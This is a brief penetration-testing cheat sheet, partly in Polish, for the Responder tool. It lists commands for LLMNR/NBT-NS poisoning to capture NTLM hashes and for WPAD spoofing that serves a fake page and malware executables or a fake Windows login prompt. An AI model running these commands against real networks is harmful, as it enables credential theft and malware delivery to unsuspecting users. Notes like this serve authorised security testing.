## RESPONDER
### Intro
Responder an LLMNR, NBT-NS and MDNS poisoner
### Preq
### Config
/usr/share/responder/Responder.conf
### Uses
Zatruwanie i zbieranie hashy NTLM  
``responder -I eth0``
#### Podkladanie WPAD - fake www + malware
``responder -i eth0 -wFfbv``  
*Serve-Html = on*  
*Serve-Exe = on*
#### Podkladanie WPAD - fakowe windowsowe okno logowania do strony w przegladarce
``responder -I eth0 -r On -w On -wFb``  
*Serve-Html = off*  
*Serve-Exe = off*

